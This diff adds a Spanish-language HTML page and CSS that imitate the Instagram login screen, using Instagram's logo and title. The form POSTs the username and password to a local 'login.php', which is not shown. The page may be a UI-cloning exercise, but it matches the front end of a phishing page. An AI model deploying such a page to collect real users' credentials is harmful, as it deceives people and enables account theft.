@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Iniciar sesión - Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="login-box">
+            <!-- Logo de Instagram -->
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png" alt="Instagram Logo" class="logo">
+            </div>
+            
+            <!-- Formulario de inicio de sesión -->
+            <form action="login.php" method="POST">
+                <div class="input-group">
+                    <input type="text" name="username" id="username" placeholder="Número de teléfono, usuario o correo electrónico" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" name="password" id="password" placeholder="Contraseña" required>
+                </div>
+                <button type="submit" class="login-btn">Iniciar sesión</button>
+                <!-- Enlace para olvidó la contraseña -->
+                <div class="forgot-password">
+                    <a href="#">¿Olvidaste tu contraseña?</a>
+                </div>
+            </form>
+        </div>
+
+        <!-- Sección de registro -->
+        <div class="signup-container">
+            <p>¿No tienes cuenta?</p>
+            <a href="#" class="signup-btn">Crear cuenta nueva</a>
+        </div>
+
+        <!-- Pie de página con enlace a la app -->
+        <div class="footer">
+            <p>Instagram te ofrece la posibilidad de iniciar sesión con tu número de teléfono, correo electrónico o cuenta de Facebook.</p>
+        </div>
+    </div>
+</body>
+</html>
+/* Reset de estilos y configuración básica */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #fafafa;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+}
+
+.login-container {
+    background-color: white;
+    width: 350px;
+    border-radius: 1rem;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    padding: 20px;
+    text-align: center;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.logo-container {
+    margin-bottom: 20px;
+}
+
+.logo {
+    width: 120px;
+    height: 120px;
+    object-fit: contain;
+}
+
+/* Estilo de los campos de entrada */
+.input-group {
+    margin-bottom: 15px;
+}
+
+input {
+    width: 100%;
+    padding: 12px;
+    font-size: 14px;
+    border-radius: 6px;
+    border: 1px solid #dbdbdb;
+    background-color: #fafafa;
+}
+
+input:focus {
+    border-color: #0095f6;
+    outline: none;
+}
+
+/* Botón de login */
+.login-btn {
+    width: 100%;
+    padding: 12px;
+    background-color: #0095f6;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+}
+
+.login-btn:hover {
+    background-color: #0078d4;
+}
+
+/* Enlace para "Olvidaste tu contraseña?" */
+.forgot-password {
+    margin-top: 10px;
+}
+
+.forgot-password a {
+    font-size: 12px;
+    color: #0095f6;
+    text-decoration: none;
+}
+
+.forgot-password a:hover {
+    text-decoration: underline;
+}
+
+/* Sección de registro */
+.signup-container {
+    margin-top: 15px;
+    font-size: 14px;
+}
+
+.signup-btn {
+    display: block;
+    width: 100%;
+    padding: 12px;
+    background-color: #fafafa;
+    border: 1px solid #dbdbdb;
+    color: #0095f6;
+    border-radius: 6px;
+    font-size: 14px;
+    text-decoration: none;
+    transition: background-color 0.3s ease;
+    text-align: center;
+}
+
+.signup-btn:hover {
+    background-color: #f0f0f0;
+}
+
+/* Pie de página */
+.footer {
+    font-size: 12px;
+    color: #8e8e8e;
+    margin-top: 15px;
+    padding-top: 10px;
+    border-top: 1px solid #dbdbdb;
+}
